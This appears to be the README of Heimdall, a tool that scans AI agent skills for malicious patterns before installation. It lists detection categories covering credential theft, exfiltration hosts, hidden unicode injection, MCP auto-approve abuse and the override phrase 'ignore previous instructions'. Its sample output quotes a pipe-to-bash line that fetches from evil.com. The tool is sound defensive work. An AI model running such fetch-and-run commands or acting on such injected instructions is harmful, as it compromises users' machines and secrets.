# Heimdall - Security Scanner for AI Agent Skills

Scan OpenClaw skills for malicious patterns before installation. Context-aware scanning with AI-powered narrative analysis.

## When to Use

Use Heimdall when:

- Installing a new skill from ClawHub or GitHub
- Reviewing skills before adding to your workspace
- Auditing existing installed skills
- Someone shares a skill URL and you want to verify it's safe

## Commands

### Basic Scan

```bash
~/clawd/skills/heimdall/scripts/skill-scan.py /path/to/skill
```

### AI-Powered Analysis (Recommended)

```bash
~/clawd/skills/heimdall/scripts/skill-scan.py --analyze /path/to/skill
```

Requires `OPENROUTER_API_KEY` env var or `~/clawd/secrets/openrouter.key`

### Scan from URL

```bash
# Clone to temp, scan, delete
git clone https://github.com/user/skill /tmp/test-skill
~/clawd/skills/heimdall/scripts/skill-scan.py --analyze /tmp/test-skill
rm -rf /tmp/test-skill
```

### Scan All Installed Skills

```bash
for skill in ~/clawd/skills/*/; do
  echo "=== $skill ==="
  ~/clawd/skills/heimdall/scripts/skill-scan.py "$skill"
done
```

## Options

| Flag                | Description                                 |
| ------------------- | ------------------------------------------- |
| `--analyze`         | AI-powered narrative analysis (uses Claude) |
| `--strict`          | Ignore context, flag everything             |
| `--json`            | Output as JSON                              |
| `-v, --verbose`     | Show all findings                           |
| `--show-suppressed` | Show context-suppressed findings            |

## What It Detects (100+ patterns)

### 🚨 Critical

- **credential_access**: .env files, API keys, tokens, private keys
- **network_exfil**: webhook.site, ngrok, requestbin
- **shell_exec**: subprocess, eval, exec, pipe to bash
- **remote_fetch**: curl/wget skill.md from internet
- **heartbeat_injection**: HEARTBEAT.md modifications
- **mcp_abuse**: no_human_approval, auto_approve
- **unicode_injection**: Hidden U+E0001-U+E007F characters

### 🔴 High

- **supply_chain**: External git repos, npm/pip installs
- **telemetry**: OpenTelemetry, Signoz, Uptrace
- **crypto_wallet**: BTC/ETH addresses, seed phrases
- **impersonation**: "ignore previous instructions"
- **privilege**: sudo -S, chmod 777

### ⚠️ Medium

- **prefill_exfil**: Google Forms data exfiltration
- **persistence**: crontab, bashrc modifications

## Example Output

### Basic Scan

```
============================================================
🔍 SKILL SECURITY SCAN REPORT v4.0
============================================================
📁 Path: /tmp/suspicious-skill
📄 Files scanned: 6
🔢 Active issues: 14
⚡ Max severity: CRITICAL
📋 Action: 🚨 CRITICAL - BLOCKED - Likely malicious
============================================================

🚨 CRITICAL (3 issues):
  [shell_exec]
    • install.sh:12 - Pipe to bash
      Match: curl https://evil.com | bash
```

### AI Analysis (--analyze)

```
============================================================
🔍 HEIMDALL SECURITY ANALYSIS
============================================================

📁 Skill: suspicious-skill
⚡ Verdict: 🚨 HIGH RISK - Requires Significant Trust

## Summary
This skill installs code from an external company that can
self-modify and sends telemetry to third-party servers.

## Key Risks

### 1. Data Exfiltration
OpenTelemetry sends execution traces to external servers.
YOUR agent's behavior → THEIR servers. 🚨

### 2. Supply Chain Attack Surface
Git clones from external repos during install and self-evolution.

## What You're Agreeing To
1. Installing their code
2. Letting it modify itself
3. Sending telemetry to them

## Recommendation
🔴 Don't install on any machine with real data/keys.
============================================================
```

## Context-Aware Scanning

Heimdall understands context to reduce false positives (~85% reduction):

| Context | Severity Adjustment                         |
| ------- | ------------------------------------------- |
| CODE    | Full severity                               |
| CONFIG  | -1 level                                    |
| DOCS    | -3 levels (patterns in README are examples) |
| STRING  | -3 levels (blocklist definitions)           |

Use `--strict` to disable context adjustment and flag everything.

## Security Sources

Patterns derived from:

- [Simon Willison - Moltbook Security Analysis](https://simonwillison.net/2026/Jan/30/moltbook/)
- [PromptArmor - MCP Tool Attacks](https://promptarmor.com)
- [LLMSecurity.net - Auto-Approve Exploits](https://llmsecurity.net)
- [OWASP - Injection Attacks](https://owasp.org/Top10/)

## Installation Notes

After installing from ClawHub, create an alias for convenience:

```bash
echo 'alias skill-scan="~/clawd/skills/heimdall/scripts/skill-scan.py"' >> ~/.bashrc
source ~/.bashrc
```

For AI analysis, ensure you have an OpenRouter API key:

```bash
# Option 1: Environment variable
export OPENROUTER_API_KEY="sk-or-..."

# Option 2: Save to file
echo "sk-or-..." > ~/clawd/secrets/openrouter.key
```

## Credits

Built by the Enterprise Crew 🚀

- Ada 🔮 (Brain + BD/Sales)
- Spock 🖖 (Research & Ops)
- Scotty 🔧 (Builder)

GitHub: https://github.com/henrino3/heimdall
